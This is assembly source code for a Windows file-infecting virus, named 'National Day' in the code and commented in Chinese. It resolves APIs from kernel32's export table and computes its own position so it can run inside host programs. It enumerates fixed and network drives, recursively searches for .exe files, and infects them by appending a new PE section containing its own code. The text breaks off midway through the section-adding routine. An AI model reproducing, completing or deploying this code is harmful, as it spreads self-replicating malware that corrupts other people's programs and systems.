

;========================================================================================
; 程序说明
;----------------------------------------------------------------------------------------
; 本程序在 link 时必须加上 /section:.text,RWE 选项!!
; -----------------------------------------------
; Look like this:
;	ml /c /coff /Zi MyGetApi.asm
;	Link /SUBSYSTEM:WINDOWS /DEBUG /DEBUGTYPE:CV /section:.text,RWE MyGetApi.obj
; ---------------------------------------------------------------------------------------
;									作者: 于渊
;									日期: 2002/9/13
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; 程序说明（结束）
;========================================================================================

;以下是本人习惯使用的注释方法
;==================================================
;说明
;--------------------------------------------------
;程序体
;; ┓; ┃; ┣ ; ┛
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
;说明（结束）
;==================================================

.586
.model flat, stdcall
option casemap :none   ; case sensitive
;include c:\hd\hd.h
;include c:\hd\mac.h 

include Y:\masm32\include\windows.inc
include Y:\masm32\include\kernel32.inc
includelib kernel32.lib
include Y:\masm32\include\user32.inc
includelib user32.lib

;include GetApiAddr.inc

MyStrcpy		proto	:DWORD, :DWORD
MyStrcmp		proto	:DWORD, :DWORD
Infect			proto	:DWORD
AddASectionToFile	proto	:DWORD, :DWORD, :DWORD
JudgeAndInfect		proto	:DWORD
SearchAndInfect		proto	:DWORD


MySetFilePointer	PROTO :DWORD,:DWORD,:DWORD,:DWORD
MyCreateFileA		PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
MyReadFile		PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
MyWriteFile		PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
MyRtlZeroMemory		PROTO :DWORD,:DWORD
MyCloseHandle		PROTO :DWORD



BASE_OF_KERNEL32	EQU	77E60000h

.data?
hInstance		DWORD	?

.code

start:
	invoke	GetModuleHandle, NULL
	mov	hInstance,eax

;****************************************************************************************************
; ->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->
;====================================================================================================
; 以下代码是要写入宿主程序的部分
;----------------------------------------------------------------------------------------------------
; 注意事项：
;     要保证下面的代码不依赖于任何的其它代码、库而能单独执行，做到使用单独的变量，函数，动态得到自己在内存中的位置等。
;----------------------------------------------------------------------------------------------------
;-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V-V

LABEL_CODE_INSIDE	LABEL	near

	jmp	__start
	;==================================================
	; 变量定义
	;--------------------------------------------------

	szViruName		BYTE	"National Day", 0, 0, 0, 0	; 病毒名字长度为 10H
	szViruVersionMajor	DWORD	1
	szViruVersionMinor	DWORD	0

	szKernel32Name		BYTE	"KERNEL32.dll", 0
	szUser32Name		BYTE	"USER32.dll", 0

	; pApiNames、pApiNamesString、pApiAddresses 三个地方名称和位置都是对应的

pApiNames		LABEL	near
				DWORD	offset szFindFirstFileA
				DWORD	offset szFindNextFileA
				DWORD	offset szFindClose
				DWORD	offset szCreateFileA
				DWORD	offset szSetFilePointer
				DWORD	offset szReadFile
				DWORD	offset szWriteFile
				DWORD	offset szRtlZeroMemory
				DWORD	offset szCloseHandle
				DWORD	offset szCreateThread
				DWORD	offset szResumeThread
				DWORD	offset szSleep
				DWORD	offset szGetLogicalDriveStrings
				DWORD	offset szGetDriveType
				DWORD	0

	szLoadLibraryA		BYTE	"LoadLibraryA", 0
	szGetProcAddress	BYTE	"GetProcAddress", 0

pApiNamesString:
	szFindFirstFileA		BYTE	"FindFirstFileA", 0
	szFindNextFileA			BYTE	"FindNextFileA", 0
	szFindClose			BYTE	"FindClose", 0
	szCreateFileA			BYTE	"CreateFileA", 0
	szSetFilePointer		BYTE	"SetFilePointer", 0
	szReadFile			BYTE	"ReadFile", 0
	szWriteFile			BYTE	"WriteFile", 0
	szRtlZeroMemory			BYTE	"RtlZeroMemory", 0
	szCloseHandle			BYTE	"CloseHandle", 0
	szCreateThread			BYTE	"CreateThread", 0
	szResumeThread			BYTE	"ResumeThread", 0
	szSleep				BYTE	"Sleep", 0
	szGetLogicalDriveStrings	BYTE	"GetLogicalDriveStringsA", 0
	szGetDriveType			BYTE	"GetDriveTypeA", 0

	szMessageBoxA		BYTE	"MessageBoxA", 0

	pUser32Base		DWORD	?			; USER32.dll 的首地址
	pfLoadLibraryA		DWORD	?			; 函数 LoadLibraryA 入口地址
	pfGetProcAddress	DWORD	?			; 函数 GetProcAddress 入口地址

pApiAddresses		LABEL	near
	pfFindFirstFileA		DWORD	?		; 函数 FindFirstFileA 入口地址
	pfFindNextFileA			DWORD	?		; 函数 FindNextFileA 入口地址
	pfFindClose			DWORD	?		; 函数 FindClose 入口地址
	pfCreateFileA			DWORD	?		; 函数 CreateFileA 入口地址
	pfSetFilePointer		DWORD	?		; 函数 SetFilePointer 入口地址
	pfReadFile			DWORD	?		; 函数 ReadFile 入口地址
	pfWriteFile			DWORD	?		; 函数 WriteFile 入口地址
	pfRtlZeroMemory			DWORD	?		; 函数 RtlZeroMemory 入口地址
	pfCloseHandle			DWORD	?		; 函数 CloseHandle 入口地址
	pfCreateThread			DWORD	?		; 函数 CreateThread 入口地址
	pfResumeThread			DWORD	?		; 函数 ResumeThread 入口地址
	pfSleep				DWORD	?		; 函数 Sleep 入口地址
	pfGetLogicalDriveStrings	DWORD	?		; 函数 GetLogicalDriveStrings 入口地址
	pfGetDriveType			DWORD	?		; 函数 GetDriveType 入口地址

	pfMessageBoxA		DWORD	?			; 函数 MessageBoxA 入口地址

	szTitle			BYTE	"title", 0
	szMsg			BYTE	"msg", 0
	
	szAllFile	BYTE	"*.*", 0
	szBackslash	BYTE	"\", 0
	szBeginPathForTest	BYTE	"D:\ForTest\", 0

	OldMessageBoxACode	BYTE	5 dup(0)
	NewMessageBoxACode	BYTE	5 dup(0)
	dwProcID		DWORD	?
	;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
	; 变量定义（结束）
	;==================================================

;==================================================
; 获取Api地址
;--------------------------------------------------
; 参数:
;	pModuleName	: Api 所在的 DLL 名字, 是判断用的, 没有实际作用
;	iBaseAddr	: DLL 在内存中的基址
;	pApiName	: Api 名字
; 返回值:
;	eax	: 保存获取的Api的地址;
;--------------------------------------------------
GetApiAddress	PROC pModuleName : DWORD, iBaseAddr : DWORD, pApiName : DWORD
	LOCAL	sznNameInExportTable[20]	: BYTE
	LOCAL	iNumberOfExptFunctions		: DWORD
	LOCAL	iBase				: DWORD
	LOCAL	pExportFuncs			: DWORD	; 指向数组, 数组每一项内容是一个引出函数的地址

	call	GetAppBase	; 以后可以用 ebx + offset VariableName 获得变量在宿主中的地址

	mov	edi, iBaseAddr				; edi 指向 DLL 在内存中的首地址
	assume	edi : ptr IMAGE_DOS_HEADER		; edi 强制类型转换成指向 IMAGE_DOS_HEADER 的指针
	cmp	[edi].e_magic, IMAGE_DOS_SIGNATURE	; 文件是否以 MZ 开始
	jnz	LABEL_ERROR				; 文件不是以 MZ 开始，跳转到 失败

	add	edi, [edi].e_lfanew			; edi 指向 PE Header
	assume	edi : ptr IMAGE_NT_HEADERS		; edi 强制类型转换成指向 IMAGE_NT_HEADERS 的指针
	cmp	[edi].Signature, IMAGE_NT_SIGNATURE	; PE Header 是否以 'PE\0\0' 开始
	jnz	LABEL_ERROR				; PE Header 不是以 'PE\0\0' 开始，跳转到 失败

	add	edi, 4					; 跳过'PE\0\0'，现在 edi 指向 File Header
	assume	edi : ptr IMAGE_FILE_HEADER		; edi 强制类型转换成指向 IMAGE_FILE_HEADER 的指针

	add	edi, sizeof IMAGE_FILE_HEADER		; edi 指向 Optional Header
	assume	edi : ptr IMAGE_OPTIONAL_HEADER32	; edi 强制类型转换成指向 IMAGE_OPTIONAL_HEADER32 的指针
	
	; 获取 DataDirectory 信息	
	lea	edi, [edi].DataDirectory.VirtualAddress	; edi 指向 Data Directory 首地址, 第一项就是 Export Symbols

	assume	edi : ptr IMAGE_DATA_DIRECTORY		; 强制类型转换
	mov	edi, [edi].VirtualAddress		; 引入表RVA（相对虚地址）
	cmp	edi, 0
	jz	LABEL_ERROR
	add	edi, iBaseAddr			; edi 仍是 RVA, 需要加上基址才是 VA
	
	assume	edi : ptr IMAGE_EXPORT_DIRECTORY

	mov	eax, [edi].nName		; ┓
	add	eax, iBaseAddr			; ┃
	push	eax				; ┃ MyStrcpy( offset sznNameInExportTable,
	lea	eax, sznNameInExportTable	; ┃ 		iBaseAddr + [edi].nName   );
	push	eax				; ┃ [edi].nName 应该是 pModuleName 才对
	call	MyStrcpy			; ┛

	lea	eax, sznNameInExportTable	; ┓
	push	eax				; ┃ MyStrcmp( offset sznNameInExportTable,
	mov	eax, pModuleName		; ┃	       pModuleName       );
	push	eax				; ┃ 把 sznNameInExportTable 跟 pModuleName 比较一下
	call	MyStrcmp			; ┛
	cmp	eax, 0				; 判断返回值, 如果不为 0 表示字符串不一样
	jnz	LABEL_ERROR			; 跳出

	mov	eax, [edi].NumberOfNames	; ┓
	mov	iNumberOfExptFunctions, eax	; ┣ 保存有名字的函数数目
	mov	eax, [edi].nBase		; ┃
	mov	iBase, eax			; ┛

	mov	esi, [edi].AddressOfNames	; ┓ esi -> 函数名字
	add	esi, iBaseAddr			; ┛

	mov	eax, [edi].AddressOfFunctions	; ┓
	add	eax, iBaseAddr			; ┣ pExportFuncs -> 函数地址
	mov	pExportFuncs, eax		; ┛

	mov	edi, [edi].AddressOfNameOrdinals; ┓ edi -> 函数序数
	add	edi, iBaseAddr			; ┛

LABEL_GET_EXPORT_FUNC_INFO_LOOP:
	mov	dx, word ptr [edi]		;  dx <- 函数序数
	movzx	edx, dx				; edx <- 函数序数
	mov	ecx, edx			; ecx <- 函数序数
	shl	ecx, 2				; ecx <- ecx * 4 (每个函数地址为4位)
	mov	eax, pExportFuncs
	add	ecx, eax			; ecx <- ecx + pExportFuncs (函数地址真正位置)
	add	edx, iBase			; edx <- 函数序数(加了基数的)

	mov	eax, pApiName			; ┓
	push	eax				; ┃
	mov	eax, [esi]			; ┣ MyStrcpy( iBaseAddr + [esi],
	add	eax, iBaseAddr			; ┃	       pApiName );
	push	eax				; ┃
	call	MyStrcmp			; ┛
	cmp	eax, 0				; 判断返回值, 如果为 0 表示字符串一样
	jz	LABEL_FUNCTION_FOUND		; 函数被找到

	add	esi, 4
	add	edi, 2
	dec	iNumberOfExptFunctions
	cmp	iNumberOfExptFunctions, 0
	jnz	LABEL_GET_EXPORT_FUNC_INFO_LOOP

	jmp	LABEL_EXPORT_TABLE_INFO_OVER	; 没找到

LABEL_FUNCTION_FOUND:
	mov	eax, dword ptr [ecx]		; eax <-- ecx （里面存的是函数的 RVA）
	add	eax, iBaseAddr			; eax <-- 函数RVA + iBaseAddr （得到 VA）
	ret

LABEL_ERROR:
	mov	eax, 0FFFFFFFFh	; 发生错误就返回 FFFFFFFFh
	ret
LABEL_EXPORT_TABLE_INFO_OVER:
	mov	eax, 0		; 没找到就返回 0
	ret

GetApiAddress	ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; 获取Api地址（结束）
;==================================================

;==================================================		┏━━━━━━━━━━━━━┓
; 得到本程序与宿主程序首地址之差				┃   如何动态得到变量地址   ┃
;--------------------------------------------------		┗━━━━━━━━━━━━━┛
; 原理:
;	  本程序中所有变量地址都是相对于本程序基址的, 若要在宿主程序中得到变量地址, 
;	可以这样操作:
;	-------------------------------------------------------
;	首先定义一些符号:
;		BaseInHost		: 宿主程序基址
;		DeltaAddrInHost		: 宿主运行时 LBL_DELTA 的地址
;		VarOffsetInHost		: 变量相对于宿主基址的偏移(运行时,内存中)
;		DeltaOffsetInHost	: LBL_DELTA 相对于宿主基址的偏移
;		VarOffset		: 变量在本程序中的偏移, 这是在编译时就已经形成了的
;		DeltaOffset		: LBL_DELTA 在本程序中的偏移, 这也是在编译时就已经形成了的
;	-------------------------------------------------------
;	宿主运行时变量的地址	= BaseInHost + VarOffsetInHost
;				= BaseInHost + DeltaOffsetInHost -  DeltaOffsetInHost + VarOffsetInHost
;				= BaseInHost + DeltaOffsetInHost - (DeltaOffsetInHost - VarOffsetInHost)
;				= BaseInHost + DeltaOffsetInHost - (DeltaOffset - VarOffset)
;				= DeltaAddrInHost - DeltaOffset + VarOffset
;				 ┗━━━━━━━┯━━━━━━━━┛
;					         └────>本函数求的就是这个差
;	-------------------------------------------------------
;	  我们可以通过 call 然后 pop 的方法取得 DeltaAddrInHost, 而 DeltaOffset 和 VarOffset在编译时已经有了,
;	以下的函数就是将 DeltaAddrInHost - DeltaOffset 求出保存在 ebx 中, 想得到那个变量的地址只需要
;			ebx + offset VariableName
;	就 OK 了!
;--------------------------------------------------------------
; 参数：
;	没有
; 返回值：
;	程序首地址保存在 ebx 中
; 注意事项:
;	在本程序中避免使用 ebx 寄存器
;--------------------------------------------------------------
GetAppBase	PROC
	call    LBL_DELTA
LBL_DELTA:
	pop	ebx			; 得到宿主运行时 LBL_DELTA 的地址
	sub	ebx, offset LBL_DELTA	; 宿主运行时 LBL_DELTA 的地址 - LBL_DELTA 在本程序中的偏移
	ret
GetAppBase	ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; 得到本程序与宿主程序首地址之差（结束）
;==================================================

;==================================================
; 字符串拷贝，仿 Strcpy
;--------------------------------------------------
; 参数：
;	pDes : 目的字符串首地址
;	pSrc : 源字符串首地址
; 返回值：
;	目的字符串首地址
;--------------------------------------------------
MyStrcpy PROC uses esi edi pDes:DWORD, pSrc:DWORD
	mov	esi, pSrc	; Source
	mov	edi, pDes	; Destination

LABEL_LOOP:
	mov	al, [esi]		; ┓
	inc	esi			; ┃
					; ┣ 逐字节移动
	mov	byte ptr [edi], al	; ┃
	inc	edi			; ┛

	cmp	al, 0		; 是否遇到 '\0'
	jnz	LABEL_LOOP	; 没遇到就继续循环，遇到就结束

	mov	eax, pDes	; 返回值是目的字符串首地址

	ret			; 函数结束，返回
MyStrcpy ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
;字符串拷贝，仿 Strcpy（结束）
;==================================================

;==================================================
; 字符串比较，仿 Strcmp
;--------------------------------------------------
; 参数：
;	pDes : 被比较字符串1的首地址
;	pSrc : 被比较字符串2的首地址
; 返回值：
;	字符串相同 <- eax = 0
;	字符串不同 <- eax = 1
;--------------------------------------------------
MyStrcmp PROC uses esi edi pDes:DWORD, pSrc:DWORD
	mov	esi, pSrc			; String 1
	mov	edi, pDes			; String 2

LABEL_STRCMP_LOOP:
	mov	al, byte ptr [esi]		; al <- esi 中当前字符
	cmp	al, byte ptr [edi]		; 比较 esi 和 edi 中对应字符
	jnz	LABEL_STRCMP_NOT_EQUAL		; 不相等就跳出
	cmp	al, 0				; 相等并且都为 '\0'
	jz	LABEL_STRCMP_EQUAL		; 表示字符串相等, 跳出
	inc	esi				; 相等但不为 '\0'
	inc	edi				; esi -> 下一个字符
	jmp	LABEL_STRCMP_LOOP		; edi -> 下一个字符

LABEL_STRCMP_NOT_EQUAL:				; 不相等
	mov	eax, 1				; eax <- 1
	jmp	LABEL_STRCMP_END		; 跳到结束处
LABEL_STRCMP_EQUAL:				; 相等
	mov	eax, 0				; eax <- 0

LABEL_STRCMP_END:				; 函数结束
	ret					; 返回
MyStrcmp ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; 字符串比较，仿 Strcmp（结束）
;==================================================

;==================================================
; 字符串连接，仿 Strcat
;--------------------------------------------------
; 参数：
;	pDes : 被连接字符串的首地址
;	pSrc : 将被连接到 pDes 的字符串的首地址
; 返回值：
;	目的字符串首地址
;--------------------------------------------------
MyStrcat PROC uses esi edi pDes:DWORD, pSrc:DWORD
	mov	esi, pSrc			; Source
	mov	edi, pDes			; Destination

LABEL_SEARCH_DEST_END_LOOP:			; 此循环用作将 edi 定位到被连接字符串（目的字符串）的末尾
	cmp	byte ptr [edi], 0		; 是否遇到 '\0'
	jz	LABEL_CONNECT_LOOP		; 没遇到就继续循环，跳到 LABEL_CONNECT_LOOP 正式进行连接
	inc	edi				; edi 指向下一个字符
	jmp	LABEL_SEARCH_DEST_END_LOOP	; 继续循环

LABEL_CONNECT_LOOP:
	mov	al, [esi]			; ┓
	inc	esi				; ┃
						; ┣ 逐字节移动
	mov	byte ptr [edi], al		; ┃
	inc	edi				; ┛

	cmp	al, 0				; 是否遇到 '\0'
	jnz	LABEL_CONNECT_LOOP		; 没遇到就继续循环，遇到就结束

	mov	eax, pDes			; 返回值是目的字符串首地址

	ret					; 函数结束，返回
MyStrcat ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
;字符串连接，仿 Strcat（结束）
;==================================================

;==================================================
; 内存拷贝，仿 Memcpy
;--------------------------------------------------
; 参数：
;	pDes : 目的内存首地址
;	pSrc : 源内存首地址
;	iSize: 要拷贝的长度
; 返回值：
;	目的字符串首地址
;--------------------------------------------------
MyMemcpy PROC uses esi edi ecx pDes:DWORD, pSrc:DWORD, iSize:DWORD
	mov	esi, pSrc	; Source
	mov	edi, pDes	; Destination
	mov	ecx, iSize	; Counter
@@:
	cmp	ecx, 0		; 判断计数器
	jz	@F		; 计数器为零时跳出

	mov	al, [esi]		; ┓
	inc	esi			; ┃
					; ┣ 逐字节移动
	mov	byte ptr [edi], al	; ┃
	inc	edi			; ┛

	dec	ecx		; 计数器减一
	jmp	@B		; 循环
@@:
	mov	eax, pDes	; 返回值是目的字符串首地址
	ret
MyMemcpy ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
;内存拷贝，仿 Memcpy（结束）
;==================================================

;==================================================
;求字符串长度，仿 Strlen
;--------------------------------------------------
; 参数：
;	pStr : 字符串首地址
; 返回值：
;	字符串长度，保存在 eax 中
;--------------------------------------------------
MyStrlen PROC uses esi pStr:DWORD
	mov	eax, 0			; 字符串长度开始是 0
	mov	esi, pStr		; esi 指向首地址

LABEL_LOOP:
	cmp	byte ptr [esi], 0	; 看 esi 指向的字符是否是 '\0'
	jz	LABEL_OVER		; 如果是 '\0'，程序结束
	inc	esi			; 如果不是 '\0'，esi 指向下一个字符
	inc	eax			;	  并且，eax 自加一
	jmp	LABEL_LOOP		; 如此循环

LABEL_OVER:
	ret				; 函数结束，返回
MyStrlen ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
;求字符串长度，仿 Strlen（结束）
;==================================================

;==================================================
; SetFilePointer
;--------------------------------------------------
MySetFilePointer	PROC arg1:DWORD, arg2:DWORD, arg3:DWORD, arg4:DWORD
	push	arg4
	push	arg3
	push	arg2
	push	arg1
	mov	eax, dword ptr [ebx + pfSetFilePointer]
	call	eax

	ret
MySetFilePointer	ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; SetFilePointer（结束）
;==================================================

;==================================================
; CreateFile
;--------------------------------------------------
MyCreateFile	PROC arg1:DWORD, arg2:DWORD, arg3:DWORD, arg4:DWORD, arg5:DWORD, arg6:DWORD, arg7:DWORD
	push	arg7
	push	arg6
	push	arg5
	push	arg4
	push	arg3
	push	arg2
	push	arg1
	mov	eax, dword ptr [ebx + pfCreateFileA]
	call	eax

	ret
MyCreateFile	ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; CreateFileA（结束）
;==================================================


;==================================================
; ReadFile
;--------------------------------------------------
MyReadFile	PROC arg1:DWORD, arg2:DWORD, arg3:DWORD, arg4:DWORD, arg5:DWORD
	push	arg5
	push	arg4
	push	arg3
	push	arg2
	push	arg1
	mov	eax, dword ptr [ebx + pfReadFile]
	call	eax

	ret
MyReadFile	ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; ReadFile（结束）
;==================================================


;==================================================
; WriteFile
;--------------------------------------------------
MyWriteFile	PROC arg1:DWORD, arg2:DWORD, arg3:DWORD, arg4:DWORD, arg5:DWORD
	push	arg5
	push	arg4
	push	arg3
	push	arg2
	push	arg1
	mov	eax, dword ptr [ebx + pfWriteFile]
	call	eax

	ret
MyWriteFile	ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; WriteFile（结束）
;==================================================


;==================================================
; RtlZeroMemory
;--------------------------------------------------
MyRtlZeroMemory	PROC arg1:DWORD, arg2:DWORD
	push	arg2
	push	arg1
	mov	eax, dword ptr [ebx + pfRtlZeroMemory]
	call	eax

	ret
MyRtlZeroMemory ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; RtlZeroMemory（结束）
;==================================================


;==================================================
; CloseHandle
;--------------------------------------------------
MyCloseHandle	PROC a:DWORD
	push	a
	mov	eax, dword ptr [ebx + pfCloseHandle]
	call	eax

	ret
MyCloseHandle	ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; CloseHandle（结束）
;==================================================

ThreadSearchAndInfectPosition		DWORD	0
;==================================================
; ThreadSearchAndInfect
;--------------------------------------------------
ThreadSearchAndInfect	PROC
	local	szDrive[100]			: BYTE
	local	p				: DWORD

	call	GetAppBase

LABEL_BEGIN_SEARCH_LOGICAL_DRIVE:
	lea	eax, szDrive					; ┓
	push	eax						; ┃
	push	100						; ┣ ::GetLogicalDriveStrings(100, szDrive);
	mov	eax, dword ptr [ebx + pfGetLogicalDriveStrings]	; ┃
	call    eax						; ┛

	lea	eax, szDrive			; ┓
	mov	p, eax				; ┛ p = szDrive;

LABEL_SEARCH_LOGICAL_DRIVE_LOOP:
	mov	eax, p
	cmp	byte ptr [eax], 0
	jz	LABEL_SEARCH_LOGICAL_DRIVE_LOOP_OVER

	push	p					; ┓
	mov	eax, dword ptr [ebx + pfGetDriveType]	; ┣ ::GetDriveType(p);
	call    eax					; ┛

	cmp	eax, DRIVE_FIXED
	jz	LABEL_INFECT_BEGIN
	cmp	eax, DRIVE_REMOTE
	jz	LABEL_INFECT_BEGIN
	jmp	LABEL_INFECT_OVER

LABEL_INFECT_BEGIN:
	mov	eax, p
	mov	dl, byte ptr [eax]
	movzx	edx, dl
	or	edx, 020h	; 要是大写字母，就变成了小写
	cmp	edx, 'x'
	jnz	LABEL_INFECT_OVER
	invoke	SearchAndInfect, p
LABEL_INFECT_OVER:

	add	p, 4

	jmp	LABEL_SEARCH_LOGICAL_DRIVE_LOOP

LABEL_SEARCH_LOGICAL_DRIVE_LOOP_OVER:


	ret
ThreadSearchAndInfect	ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; ThreadSearchAndInfect（结束）
;==================================================

;==================================================
; SearchAndInfect
;--------------------------------------------------
SearchAndInfect	PROC pszBeginPath:DWORD
	local	szFileToSearch[MAX_PATH]	: BYTE
	local	szDirTmp[MAX_PATH]		: BYTE
	local	findData			: WIN32_FIND_DATA
	local	hFind				: HANDLE

	call	GetAppBase
;	jmp	LABEL_SEARCHANDINFECT_BEGIN
;	
;	szAllFile	BYTE	"*.*", 0
;	szBackslash	BYTE	"\", 0
;
;LABEL_SEARCHANDINFECT_BEGIN:
	invoke	MyStrcpy, addr szFileToSearch, pszBeginPath	;strcpy(szFileToSearch, lpszBeginPath);
	lea	eax, [offset szAllFile + ebx]	; ┓
	push	eax				; ┃
	lea	eax, szFileToSearch		; ┣ strcat(szFileToSearch, "*.*");
	push	eax				; ┃
	call	MyStrcat			; ┛

	lea	eax, findData				; ┓
	push	eax					; ┃
	lea	eax, szFileToSearch			; ┣ hFind = ::FindFirstFile( szFileToSearch, &findData );
	push	eax					; ┃
	mov	eax, dword ptr [ebx + pfFindFirstFileA]	; ┃
	call    eax					; ┃
	mov	hFind, eax				; ┛

	cmp	hFind, INVALID_HANDLE_VALUE
	jz	LABEL_SEARCHANDINFECT_END
	jmp	LABEL_JUDGE

LABEL_FIND_NEXT_FILE:
	push	50					; ┓
	mov	eax, dword ptr [ebx + pfSleep]		; ┣ Sleep(500);
	call    eax					; ┛
	lea	eax, findData				; ┓
	push	eax					; ┃
	push	hFind					; ┣ invoke FindNextFileA, hFind, addr findData
	mov	eax, dword ptr [ebx + pfFindNextFileA]	; ┃
	call    eax					; ┛
	cmp	eax, 0
	jz	LABEL_FIND_OVER
LABEL_JUDGE:
	and	findData.dwFileAttributes, 010h	; 是目录吗？
	jz	LABEL_FIND_A_FILE		; 不是目录，JudgeAndInfect（判断并感染）
	cmp	findData.cFileName[0], '.'	; 是目录，判断是 '.' 或 '..' 吗？
	jz	LABEL_FIND_NEXT_FILE		; 是的话继续找下一个文件
	invoke	MyStrcpy, addr szDirTmp, pszBeginPath	;    strcpy(szDirTmp, lpszBeginPath);
	lea	eax, findData.cFileName			; ┓
	push	eax					; ┃
	lea	eax, szDirTmp				; ┣ strcat(szDirTmp, findData.cFileName);
	push	eax					; ┃
	call	MyStrcat				; ┛
	lea	eax, szBackslash			; ┓
	add	eax, ebx				; ┃
	push	eax					; ┣ strcat(szDirTmp, findData.cFileName);
	lea	eax, szDirTmp				; ┃
	push	eax					; ┃
	call	MyStrcat				; ┛
	invoke	SearchAndInfect, addr szDirTmp		;    SearchAndInfect(szDirTmp);
	jmp	LABEL_FIND_NEXT_FILE	
LABEL_FIND_A_FILE:
	invoke	MyStrcpy, addr szDirTmp, pszBeginPath	;strcpy(szDirTmp, lpszBeginPath);
	invoke	MyStrcat, addr szDirTmp, addr findData.cFileName
	invoke	JudgeAndInfect, addr szDirTmp
	jmp	LABEL_FIND_NEXT_FILE

LABEL_FIND_OVER:
	push	hFind					; ┓
	mov	eax, dword ptr [ebx + pfFindClose]	; ┃;invoke FindClose, hFind
	call    eax					; ┛

LABEL_SEARCHANDINFECT_END:
	ret
SearchAndInfect	ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; SearchAndInfect（结束）
;==================================================

;==================================================
; JudgeAndInfect
;--------------------------------------------------
JudgeAndInfect	PROC uses edx pszFileName:DWORD
	local	p	: DWORD

	mov	eax, pszFileName
	mov	p, eax
	invoke	MyStrlen, pszFileName
	add	eax, p
	sub	eax, 4
	cmp	byte ptr [eax], '.'
	jnz	LABEL_NOT_EXE_FILE
	inc	eax
	mov	dl, [eax]
	movzx	edx, dl
	or	edx, 020h	; 要是大写字母，就变成了小写
	cmp	edx, 'e'
	jnz	LABEL_NOT_EXE_FILE
	inc	eax
	mov	dl, [eax]
	movzx	edx, dl
	or	edx, 020h	; 要是大写字母，就变成了小写
	cmp	edx, 'x'
	jnz	LABEL_NOT_EXE_FILE
	inc	eax
	mov	dl, [eax]
	movzx	edx, dl
	or	edx, 020h	; 要是大写字母，就变成了小写
	cmp	edx, 'e'
	jnz	LABEL_NOT_EXE_FILE
	invoke	Infect, pszFileName

LABEL_NOT_EXE_FILE:

	ret
JudgeAndInfect	ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; JudgeAndInfect（结束）
;==================================================

;==================================================
; Infect
;--------------------------------------------------
Infect	PROC pszFileName:DWORD
	call	GetAppBase

	lea	eax, iCodeInsideLength
	add	eax, ebx
	mov	edx, dword ptr [eax]
	add	edx, 4
	push	edx
	lea	eax, LABEL_CODE_INSIDE
	add	eax, ebx
	push	eax
	push	pszFileName
	call	AddASectionToFile
	;invoke	AddASectionToFile, pszFileName, edx, [eax]

	ret
Infect	ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; Infect（结束）
;==================================================

;==================================================
; 增加一个 Section
;--------------------------------------------------
; 返回值:
;	eax = 0		-> 成功
;	eax = ffffffffh	-> 失败
;--------------------------------------------------
; 参数:
;	pszFileName	: 文件名
;	pSectionContent	: 节中内容
;	iSectionLength	: 节中内容的长度
;--------------------------------------------------
SIZE_OF_BUFFER_TO_WRITE		EQU	4096
AddASectionToFile PROC  pszFileName:DWORD, pSectionContent:DWORD, iSectionLength:DWORD
	LOCAL	hFileToBeModified			: HANDLE
	LOCAL	pBuf[1024]				: BYTE
	LOCAL	pBufViruName[16]			: BYTE
	LOCAL	pBufToWrite[SIZE_OF_BUFFER_TO_WRITE]	: BYTE
	LOCAL	iNumOfBytesRead				: DWORD
	LOCAL	iNumOfBytesWritten			: DWORD
	LOCAL	iNumberOfSectionsOrigin			: WORD
	LOCAL	iNumberOfSectionsPosition		: DWORD	; 节数在文件中的偏移
	LOCAL	iSectionAlignment			: DWORD	; 节对齐粒度
	LOCAL	iFileAlignment				: DWORD	; 文件对齐粒度
	LOCAL	iNewSectionHdrPosition			: DWORD	; 新的 Section header 相对于文件头的偏移
	;LOCAL	iLastPhysicalAddress			: DWORD	; ┓ 最后的节中诸数据	实际内容的长度(没用到)
	LOCAL	iLastPointerToRawData			: DWORD	; ┛			文件偏移
	LOCAL	iNewPhysicalAddress			: DWORD	; ┓			实际内容的长度
	LOCAL	iNewVirtualAddress			: DWORD	; ┃ 新加的节中诸数据	RVA
	LOCAL	iNewSizeOfRawData			: DWORD	; ┃			文件对齐后的长度
